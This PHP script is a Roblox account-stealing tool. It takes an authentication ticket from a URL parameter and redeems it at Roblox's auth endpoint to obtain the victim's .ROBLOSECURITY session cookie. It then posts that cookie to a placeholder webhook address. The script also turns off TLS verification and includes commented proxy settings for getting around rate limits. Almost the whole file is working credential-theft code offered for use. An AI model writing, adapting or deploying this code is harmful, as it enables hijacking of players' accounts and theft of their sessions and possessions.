<?php
    $ticket = htmlspecialchars($_GET["t"]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");

    //remove that if you experience issues
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    //just added that because i got ratelimited by roblox api, add it back and replace with some SOCKS4 proxy if you experience issues
    //curl_setopt($ch, CURLOPT_PROXY, "185.94.219.160");
    //curl_setopt($ch, CURLOPT_PROXYPORT, "1080");
    //curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
    //curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"authenticationTicket\": \"$ticket\"}");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Referer: https://www.roblox.com/games/1818/--',
        'Origin: https://www.roblox.com',
        'User-Agent: Roblox/WinInet',
        'RBXAuthenticationNegotiation: 1'
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo $output;
    $cookie = null;
    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
    if ($cookie) {
        $curl = curl_init("https://yourwebhook.com");

        //remove that if you experience issues
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);

        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, array("content" => "`$cookie`"));
                
        curl_exec($curl);
    }
?>
